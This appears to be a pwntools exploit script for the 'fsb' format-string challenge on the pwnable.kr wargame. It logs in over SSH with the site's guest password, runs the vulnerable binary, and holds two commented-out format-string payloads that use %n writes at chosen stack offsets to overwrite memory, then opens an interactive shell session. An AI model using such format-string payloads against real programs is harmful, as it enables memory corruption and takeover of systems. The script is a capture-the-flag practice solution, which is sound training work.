from pwn import *
#context.log_level='debug'

s = ssh('fsb','pwnable.kr',port=2222,password='guest')
n = s.process('./fsb')
elf = ELF('./fsb')

#payload1 = '%134520836d%14$n'
#payload2 = '%134514335d%20$n'

#n.sendlineafter('Give me some format strings(1)',payload1)
#n.sendlineafter('Give me some format strings(2)',payload2)

n.interactive()
